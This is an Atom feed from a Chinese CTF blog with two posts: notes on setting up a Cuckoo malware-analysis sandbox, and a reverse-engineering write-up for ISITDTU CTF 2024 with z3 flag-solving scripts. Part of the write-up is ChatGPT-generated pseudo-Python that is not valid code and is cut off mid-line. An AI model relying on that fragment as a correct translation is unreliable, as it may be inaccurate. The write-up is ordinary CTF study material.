<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>能打一辈子CTF吗？</title>
  <icon>https://www.gravatar.com/avatar/260de78781b3355b5fcbb52d09a7a2a9</icon>
  <subtitle>呜呜什么时候能成为厉害的会二进制的大人啊</subtitle>
  <link href="https://github.com/xyy9233/xyy9233.github.io.git/atom.xml" rel="self"/>
  
  <link href="https://github.com/xyy9233/xyy9233.github.io.git/"/>
  <updated>2024-10-29T20:24:15.626Z</updated>
  <id>https://github.com/xyy9233/xyy9233.github.io.git/</id>
  
  <author>
    <name>wind_9233</name>
    <email>1768765226@qq.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>配置cuckoo踩的坑——</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/10/30/%E9%85%8D%E7%BD%AEcuckoo%E8%B8%A9%E7%9A%84%E5%9D%91%E2%80%94%E2%80%94/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/10/30/%E9%85%8D%E7%BD%AEcuckoo%E8%B8%A9%E7%9A%84%E5%9D%91%E2%80%94%E2%80%94/</id>
    <published>2024-10-29T16:00:00.000Z</published>
    <updated>2024-10-29T20:24:15.626Z</updated>
    
    <content type="html"><![CDATA[<h1 id="配置cuckoo踩的坑——"><a href="#配置cuckoo踩的坑——" class="headerlink" title="配置cuckoo踩的坑——"></a>配置cuckoo踩的坑——</h1><p><em>&#x2F;&#x2F;TODO：[这里跳过了*<em>jupyter</em></em>]*</p><p><strong>尽量以事情需要完成的先后排列，配置时候给电脑说点好话配的又快又顺√</strong></p><p><strong>win7配置需要看虚拟机头上的报错！！！！</strong></p><p>主要参考的配置文章：<br><a href="https://www.cnblogs.com/drc01or/p/18303840#8%E8%AE%BE%E7%BD%AEvirtualbox%E7%8E%AF%E5%A2%83">Ubuntu 20.04安装cuckoo sandbox - drc01or - 博客园</a></p><p>这个师傅写的很详细，跟着没问题</p><h2 id="宿主机硬盘大小——至少40G"><a href="#宿主机硬盘大小——至少40G" class="headerlink" title="宿主机硬盘大小——至少40G"></a>宿主机硬盘大小——至少40G</h2><p>会安装很多东西，30G左右，能大一点大一点吧……</p><blockquote><p>low disk space on filesystem root</p></blockquote><p>解决方法：</p><p><a href="https://blog.csdn.net/Xin_101/article/details/125929428?fromshare=blogdetail&sharetype=blogdetail&sharerId=125929428&sharerefer=PC&sharesource=m0_73495245&sharefrom=from_link">https://blog.csdn.net/Xin_101/article/details/125929428?fromshare=blogdetail&amp;sharetype=blogdetail&amp;sharerId=125929428&amp;sharerefer=PC&amp;sharesource=m0_73495245&amp;sharefrom=from_link</a></p><p>查看使用情况命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df -h</span><br></pre></td></tr></table></figure><p>安装分区工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gparted -y</span><br></pre></td></tr></table></figure><p>启动分区工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gparted</span><br></pre></td></tr></table></figure><p>选中分区右键resize，之后拖动上面宽边调整大小（或者直接改数值）</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241030003738200.png" alt="image-20241030003738200"></p><p>记得点击<strong>绿色对勾保存</strong></p><h2 id="宿主机-20-04-先打开虚拟化选项"><a href="#宿主机-20-04-先打开虚拟化选项" class="headerlink" title="宿主机(20.04)先打开虚拟化选项"></a>宿主机(20.04)先打开虚拟化选项</h2><blockquote><p>VT-x is not available(VERR_VMX_NO_VMX)</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241030003103511.png" alt="image-20241030003103511"></p></blockquote><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241030002940125.png" alt="image-20241030002940125"></p><h2 id="换源-选对版本"><a href="#换源-选对版本" class="headerlink" title="换源-选对版本"></a>换源-选对版本</h2><blockquote><p> 相关报错：hub 2-2:1.0: hub_ext_port_status failed (err &#x3D; -110)    </p></blockquote><p><a href="https://blog.csdn.net/csdhell/article/details/129419353?fromshare=blogdetail&sharetype=blogdetail&sharerId=129419353&sharerefer=PC&sharesource=m0_73495245&sharefrom=from_link">https://blog.csdn.net/csdhell/article/details/129419353?fromshare=blogdetail&amp;sharetype=blogdetail&amp;sharerId=129419353&amp;sharerefer=PC&amp;sharesource=m0_73495245&amp;sharefrom=from_link</a></p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241030002702080.png" alt="image-20241030002702080"></p><h2 id="设置共享文件夹需要关闭虚拟机，可以先装…"><a href="#设置共享文件夹需要关闭虚拟机，可以先装…" class="headerlink" title="设置共享文件夹需要关闭虚拟机，可以先装…"></a>设置共享文件夹需要关闭虚拟机，可以先装…</h2><p>往下划两个问题就是如何安装</p><h2 id="我虚拟机里的鼠标！！！失灵了！！！！！"><a href="#我虚拟机里的鼠标！！！失灵了！！！！！" class="headerlink" title="我虚拟机里的鼠标！！！失灵了！！！！！"></a>我虚拟机里的鼠标！！！失灵了！！！！！</h2><p>我知道没多少人会看这个…</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241030013450350.png" alt="image-20241030013450350"></p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241030013531524.png" alt="image-20241030013531524"></p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241030013456169.png" alt="image-20241030013456169"></p><p>点击”Right Ctrl“或者按右边的Ctrl键都可以</p><h2 id="为什么！win7-x86-以光盘打开始终报错！VirtualBox-Fatal-Could-not-read-from-Boot-Medium-System-Halted"><a href="#为什么！win7-x86-以光盘打开始终报错！VirtualBox-Fatal-Could-not-read-from-Boot-Medium-System-Halted" class="headerlink" title="为什么！win7 x86 以光盘打开始终报错！VirtualBox: Fatal: Could not read from Boot Medium! System Halted"></a>为什么！win7 x86 以光盘打开始终报错！VirtualBox: Fatal: Could not read from Boot Medium! System Halted</h2><p><strong>先以压缩包形式打开，看看是哪种：</strong>！！很感谢师傅做成安装助手的样子！！但是文件名后缀为iso真的一直没发现问题出现在哪里，debug了两个小时！！！！<br><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/783937af2c99720ed2f59ccefcefb03f.png" alt="img"></p><h2 id="关于win7设置共享文件夹—扩展版本对应"><a href="#关于win7设置共享文件夹—扩展版本对应" class="headerlink" title="关于win7设置共享文件夹—扩展版本对应"></a>关于win7设置共享文件夹—扩展版本对应</h2><p><a href="https://www.cnblogs.com/bobyin/p/13227041.html">https://www.cnblogs.com/bobyin/p/13227041.html</a></p><blockquote><p>扩展安装失败（orz</p></blockquote><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241030012121049.png" alt="image-20241030012121049"></p><h2 id="扩展文件夹未出现"><a href="#扩展文件夹未出现" class="headerlink" title="扩展文件夹未出现"></a>扩展文件夹未出现</h2><p>扩展放在VitrualBox安装目录下，</p><p>确保Virtualbox和win7都安装了扩展（两个地方）！！！</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241030024350489.png" alt="image-20241030024350489"></p><p><strong>然后看报错！！！</strong></p><h2 id="pillow版本没有了"><a href="#pillow版本没有了" class="headerlink" title="pillow版本没有了"></a>pillow版本没有了</h2><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241030022210846.png" alt="image-20241030022210846"></p><p>这里直接在win7 虚拟机里：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python pip install pillow==<span class="number">6</span>.<span class="number">2</span>.<span class="number">2</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;配置cuckoo踩的坑——&quot;&gt;&lt;a href=&quot;#配置cuckoo踩的坑——&quot; class=&quot;headerlink&quot; title=&quot;配置cuckoo踩的坑——&quot;&gt;&lt;/a&gt;配置cuckoo踩的坑——&lt;/h1&gt;&lt;p&gt;&lt;em&gt;&amp;#x2F;&amp;#x2F;TODO：[这里跳过</summary>
      
    
    
    
    
    <category term="cuckoo" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/cuckoo/"/>
    
  </entry>
  
  <entry>
    <title>ISITDTU CTF 2024 | Reverse</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/10/28/ISITDTU%20CTF%202024%20%20Reverse/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/10/28/ISITDTU%20CTF%202024%20%20Reverse/</id>
    <published>2024-10-27T16:00:00.000Z</published>
    <updated>2024-10-30T11:39:38.087Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ISITDTU-CTF-2024-Reverse"><a href="#ISITDTU-CTF-2024-Reverse" class="headerlink" title="ISITDTU CTF 2024 | Reverse"></a>ISITDTU CTF 2024 | Reverse</h1><h2 id="RE01"><a href="#RE01" class="headerlink" title="RE01"></a>RE01</h2><p>This is a normal reverse chill, open with IDA Pro</p><p>input flag, encode two times, compare</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241028134353571.png" alt="image-20241028134353571"></p><p>look at a old friend_ TlsCallback!,remove debugger</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20241028135844884.png" alt="image-20241028135844884"></p><h2 id="The-Chamber-of-Flag"><a href="#The-Chamber-of-Flag" class="headerlink" title="The Chamber of Flag:"></a>The Chamber of Flag:</h2><p>分析需要爆破【】</p><p>第一步爆破密码：808017</p><p>爆破脚本【】</p><p>之后是crashed！！</p><p>【图片】</p><p>fix these 2 values</p><p>【正确】</p><h2 id="animal"><a href="#animal" class="headerlink" title="animal"></a>animal</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s = Solver()</span><br><span class="line">flag = [BitVec(<span class="string">f&quot;flag[<span class="subst">&#123;i&#125;</span>]&quot;</span>,<span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>):</span><br><span class="line">    s.add(flag[i]&lt;<span class="number">0x80</span>)</span><br><span class="line">    s.add(flag[i]&gt;<span class="number">0x1f</span>)</span><br><span class="line">s.add(flag[<span class="number">8</span>]==<span class="number">97</span>)</span><br><span class="line">s.add(flag[<span class="number">33</span>] == flag[<span class="number">34</span>])</span><br><span class="line">s.add(flag[<span class="number">19</span>]==<span class="number">116</span>)</span><br><span class="line">s.add(flag[<span class="number">17</span>]==<span class="number">0x63</span>)</span><br><span class="line">s.add(flag[<span class="number">18</span>]==<span class="number">0x61</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">v2 = flag[<span class="number">27</span>]</span><br><span class="line">v3 = flag[<span class="number">1</span>]</span><br><span class="line">v4 = flag[<span class="number">32</span>]</span><br><span class="line">v5 = flag[<span class="number">8</span>]</span><br><span class="line">v6 = flag[<span class="number">29</span>]</span><br><span class="line">s.add( v5 * v3 + v4 * v2 * flag[<span class="number">25</span>] - v6 == <span class="number">538738</span> )</span><br><span class="line"></span><br><span class="line">v7 = flag[<span class="number">4</span>]</span><br><span class="line">v8 = flag[<span class="number">10</span>]</span><br><span class="line">v9 = flag[<span class="number">20</span>]</span><br><span class="line">s.add( flag[<span class="number">7</span>] + v9 * v8 * v7 - flag[<span class="number">6</span>] - flag[<span class="number">11</span>] == <span class="number">665370</span> )</span><br><span class="line"></span><br><span class="line">v10 = flag[<span class="number">30</span>]</span><br><span class="line">s.add( flag[<span class="number">14</span>] + (flag[<span class="number">16</span>] - <span class="number">1</span>) * flag[<span class="number">31</span>] - v10 * flag[<span class="number">22</span>] ==<span class="number">0xFFFFF47F</span> )</span><br><span class="line"></span><br><span class="line">v11 = flag[<span class="number">18</span>]</span><br><span class="line">v12 = flag[<span class="number">33</span>]</span><br><span class="line">s.add( v12 + flag[<span class="number">3</span>] - flag[<span class="number">9</span>] - v11 - flag[<span class="number">11</span>] - v7 == <span class="number">0xFFFFFF41</span> )</span><br><span class="line"></span><br><span class="line">s.add( v3 + v10 + v11 + flag[<span class="number">25</span>] * v6 - v5 == <span class="number">4853</span> )</span><br><span class="line"></span><br><span class="line">v13 = flag[<span class="number">7</span>]</span><br><span class="line">v14 = flag[<span class="number">13</span>]</span><br><span class="line">s.add( v14 + flag[<span class="number">5</span>] - v13 * flag[<span class="number">14</span>] * flag[<span class="number">23</span>] * flag[<span class="number">2</span>] == <span class="number">0xFADD6797</span> )</span><br><span class="line"></span><br><span class="line">v15 = flag[<span class="number">9</span>]</span><br><span class="line">s.add( v14 + v15 * flag[<span class="number">5</span>] * flag[<span class="number">12</span>] + v2 * v8 == <span class="number">873682</span> )</span><br><span class="line"></span><br><span class="line">v16 = v15 * flag[<span class="number">21</span>]</span><br><span class="line">v17 = flag[<span class="number">6</span>]</span><br><span class="line">v18 = v11 * v16</span><br><span class="line">v19 = flag[<span class="number">22</span>]</span><br><span class="line">s.add( v19 + flag[<span class="number">3</span>] + v18 - v17 == <span class="number">451644</span> )</span><br><span class="line"></span><br><span class="line">v20 = flag[<span class="number">24</span>]</span><br><span class="line">s.add( flag[<span class="number">21</span>] + flag[<span class="number">34</span>] + v20 + v4 * flag[<span class="number">23</span>] - v7 == <span class="number">9350</span> )</span><br><span class="line"></span><br><span class="line">v21 = flag[<span class="number">17</span>]</span><br><span class="line">v22 = flag[<span class="number">19</span>]</span><br><span class="line">v29 = flag[<span class="number">35</span>]</span><br><span class="line">v28 = flag[<span class="number">26</span>]</span><br><span class="line">s.add( v20 + v29 + flag[<span class="number">17</span>] - v22 - v28 - v17 == <span class="number">27</span> )</span><br><span class="line"></span><br><span class="line">v23 = flag[<span class="number">15</span>]</span><br><span class="line">s.add( flag[<span class="number">14</span>] + flag[<span class="number">13</span>] + v23 + flag[<span class="number">23</span>] * v22 - flag[<span class="number">3</span>] == <span class="number">11247</span>)</span><br><span class="line">v24 = v13 * flag[<span class="number">12</span>]</span><br><span class="line">v25 = flag[<span class="number">2</span>]</span><br><span class="line">s.add(v25 + v21 + v24 - v23 - flag[<span class="number">21</span>] == <span class="number">13297</span>)</span><br><span class="line">v26 = flag[<span class="number">0</span>]</span><br><span class="line">s.add(v5 + v29 + v28 + flag[<span class="number">28</span>] - v26 - v9 == <span class="number">266</span>)</span><br><span class="line">s.add(v25 + v21 + v26 + flag[<span class="number">12</span>] * flag[<span class="number">28</span>] - v3 == <span class="number">10422</span>)</span><br><span class="line">s.add( v19 + v23 + flag[<span class="number">5</span>] * v22 - flag[<span class="number">34</span>] - flag[<span class="number">11</span>] == <span class="number">9883</span> )</span><br><span class="line"></span><br><span class="line">s.add(v8 * v12 + flag[<span class="number">16</span>] * (<span class="number">1</span> - v9) - v26 == <span class="number">0xFFFFEA1C</span>)</span><br><span class="line"><span class="built_in">print</span>(s.check())</span><br><span class="line">m = s.model()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(m.<span class="built_in">eval</span>(flag[i]).as_long()),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="2much"><a href="#2much" class="headerlink" title="2much"></a>2much</h2><p>Parent-child processes interact with each other via sigsegv signals. Parent process edits the rip and r13 registers when recieve the sigsegv signal from child process.</p><p>The child process obtains the value of r13 from the parent process and proceeds to execute the check function. Initially, it examines the first 8 bytes of the flag using the XXTEA encryption algorithm. Subsequently, it alters the endianness of the flag and encrypts it using a potentially custom encryption method.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ROL</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> ((a &lt;&lt; b) | ((a &gt;&gt; (<span class="number">32</span> - b))) &amp; ((<span class="number">1</span> &lt;&lt; b) - <span class="number">1</span>)) &amp; <span class="number">0xffffffff</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># s = Solver()</span></span><br><span class="line"><span class="comment"># flag = [BitVec(f&quot;flag[&#123;i&#125;]&quot;, 32) for i in range(12)]</span></span><br><span class="line"><span class="comment"># flag = [0x23222120, 0x27262524, 0x2B2A2928, 0x2F2E2D2C, 0x33323130, 0x37363534, 0x3B3A3938, 0x3F3E3D3C, 0x43424140, 0x47464544, 0x4B4A4948, 0x4F4E4D4C]</span></span><br><span class="line">key = [<span class="number">0x00000058</span>, <span class="number">0x00000038</span>, <span class="number">0x000003C0</span>, <span class="number">0x000000D0</span>, <span class="number">0x00000120</span>, <span class="number">0x00000014</span>, <span class="number">0x00000060</span>, <span class="number">0x0000002C</span>, <span class="number">0x00000380</span>,</span><br><span class="line">       <span class="number">0x000000F0</span>, <span class="number">0x000001A0</span>, <span class="number">0x00000012</span>]</span><br><span class="line">enc = [<span class="number">0x46b1326b</span>, <span class="number">0x946e97c1</span>, <span class="number">0x948c5e04</span>, <span class="number">0x6ffa147c</span>, <span class="number">0x7eebb206</span>, <span class="number">0x33323ae4</span>, <span class="number">0x9db0da9</span>, <span class="number">0xe6597317</span>, <span class="number">0x32250c8c</span>, <span class="number">0xaa2628c4</span>, <span class="number">0xee891967</span>, <span class="number">0x34b9d03d</span>]</span><br><span class="line"><span class="comment"># enc = [0xcbed0e22,0x09820422,0xc1758233,0x347240f0,0xa9ae043d,0x1ec20387,0x2f79d867,0x0748f6a3,0x8b1db88e,0x87c910b0,0xf6a12e64,0xa315bd3f]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(12):</span></span><br><span class="line"><span class="comment">#     print(struct.pack(&quot;&lt;I&quot;,enc[i]).hex())</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    s = Solver()</span><br><span class="line">    flag = [BitVec(<span class="string">f&quot;flag[<span class="subst">&#123;i&#125;</span>]&quot;</span>, <span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>)]</span><br><span class="line">    v13 = flag[<span class="number">7</span>] ^ flag[<span class="number">3</span>]</span><br><span class="line">    v14 = ROL(flag[<span class="number">4</span>] ^ flag[<span class="number">8</span>] ^ flag[<span class="number">0</span>], <span class="number">5</span>) ^ ROL(flag[<span class="number">4</span>] ^ flag[<span class="number">8</span>] ^ flag[<span class="number">0</span>], <span class="number">14</span>)</span><br><span class="line">    v15 = flag[<span class="number">9</span>] ^ flag[<span class="number">5</span>] ^ flag[<span class="number">1</span>]</span><br><span class="line">    v16 = v14 ^ flag[<span class="number">1</span>]</span><br><span class="line">    v17 = v14 ^ flag[<span class="number">5</span>]</span><br><span class="line">    v18 = ROL(v15, <span class="number">5</span>) ^ ROL(v15, <span class="number">14</span>)</span><br><span class="line">    v19 = flag[<span class="number">6</span>] ^ flag[<span class="number">2</span>]</span><br><span class="line">    v20 = v18 ^ flag[<span class="number">2</span>]</span><br><span class="line">    v21 = ROL(flag[<span class="number">10</span>] ^ v19, <span class="number">5</span>) ^ ROL(flag[<span class="number">10</span>] ^ v19, <span class="number">14</span>)</span><br><span class="line">    v22 = v21 ^ flag[<span class="number">3</span>]</span><br><span class="line">    v23 = v21 ^ flag[<span class="number">7</span>]</span><br><span class="line">    v24 = ROL(flag[<span class="number">11</span>] ^ v13, <span class="number">5</span>) ^ ROL(flag[<span class="number">11</span>] ^ v13, <span class="number">14</span>)</span><br><span class="line">    v25 = v24 ^ flag[<span class="number">4</span>]</span><br><span class="line">    v26 = v18 ^ flag[<span class="number">6</span>]</span><br><span class="line">    v27 = v24 ^ key[i] ^ flag[<span class="number">0</span>]</span><br><span class="line">    v28 = ROL(flag[<span class="number">8</span>] ^ v24, <span class="number">11</span>)</span><br><span class="line">    v29 = ROL(flag[<span class="number">9</span>] ^ v14, <span class="number">11</span>)</span><br><span class="line">    v30 = ROL(flag[<span class="number">10</span>] ^ v18, <span class="number">11</span>)</span><br><span class="line">    v31 = ROL(flag[<span class="number">11</span>] ^ v21, <span class="number">11</span>)</span><br><span class="line">    s.add(enc[<span class="number">10</span>] == ROL(v28 ^ v23 &amp; ~v27, <span class="number">8</span>))</span><br><span class="line">    s.add(enc[<span class="number">11</span>] == ROL(v29 ^ v25 &amp; ~v16, <span class="number">8</span>))</span><br><span class="line">    s.add(enc[<span class="number">4</span>] == ROL(v23 ^ v27 &amp; ~v28, <span class="number">1</span>))</span><br><span class="line">    s.add(enc[<span class="number">0</span>] == v27 ^ v28 &amp; ~v23)</span><br><span class="line">    s.add(enc[<span class="number">9</span>] == ROL(v31 ^ v26 &amp; ~v22, <span class="number">8</span>))</span><br><span class="line">    s.add(enc[<span class="number">8</span>] == ROL(v30 ^ v17 &amp; ~v20, <span class="number">8</span>))</span><br><span class="line">    s.add(enc[<span class="number">6</span>] == ROL(v17 ^ v20 &amp; ~v30, <span class="number">1</span>))</span><br><span class="line">    s.add(enc[<span class="number">5</span>] == ROL(v25 ^ v16 &amp; ~v29, <span class="number">1</span>))</span><br><span class="line">    s.add(enc[<span class="number">2</span>] == v30 &amp; ~v17 ^ v20)</span><br><span class="line">    s.add(enc[<span class="number">1</span>] == v29 &amp; ~v25 ^ v16)</span><br><span class="line">    s.add(enc[<span class="number">7</span>] == ROL(v26 ^ v22 &amp; ~v31, <span class="number">1</span>))</span><br><span class="line">    s.add(enc[<span class="number">3</span>] == v31 &amp; ~v26 ^ v22)</span><br><span class="line">    <span class="keyword">if</span> s.check() == sat:</span><br><span class="line">        mol = s.model()</span><br><span class="line">        flag1 = [mol.<span class="built_in">eval</span>(i).as_long() <span class="keyword">for</span> i <span class="keyword">in</span> flag]</span><br><span class="line">        enc = flag1.copy()</span><br><span class="line">        <span class="comment"># print(flag)</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> flag1:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">hex</span>(i),end=<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;unsat&#x27;</span>)</span><br><span class="line">        <span class="built_in">input</span>()</span><br></pre></td></tr></table></figure><h2 id="re02"><a href="#re02" class="headerlink" title="re02"></a>re02</h2><p>用chatGPT跑了一个：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Initialize some memory regions and registers with zeroes and specific values</span></span><br><span class="line">mem[<span class="number">0x20</span>] = <span class="number">0</span></span><br><span class="line">mem[<span class="number">0x40</span>] = <span class="number">0</span></span><br><span class="line">register_A = <span class="number">0x3F</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Main loop setup</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">from</span> <span class="number">0x00</span> to <span class="number">0x20</span>:</span><br><span class="line">    mem[i] = i  <span class="comment"># Write incremental values to memory</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Another loop setup with a delay or incrementing operation</span></span><br><span class="line">register_X = <span class="number">0x10</span></span><br><span class="line">register_A = <span class="number">0x0F</span></span><br><span class="line"><span class="keyword">while</span> register_X != <span class="number">0</span>:</span><br><span class="line">    mem[<span class="number">0x07</span>] = register_X</span><br><span class="line">    register_X -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Nested loops with memory manipulations</span></span><br><span class="line">register_Y = <span class="number">0x20</span></span><br><span class="line"><span class="keyword">while</span> register_Y != <span class="number">0</span>:</span><br><span class="line">    mem[<span class="number">0x06</span>] = register_Y</span><br><span class="line">    register_Y -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Load some values into specific memory locations with specific bit masking</span></span><br><span class="line">mask_value = <span class="number">0x80</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x02</span>, <span class="number">0x20</span>):</span><br><span class="line">    <span class="keyword">if</span> i &amp; mask_value:</span><br><span class="line">        register_A = i</span><br><span class="line">        mem[<span class="number">0x20</span>] = register_A</span><br><span class="line"></span><br><span class="line"><span class="comment"># Perform multiple memory address updates with looping conditions</span></span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> <span 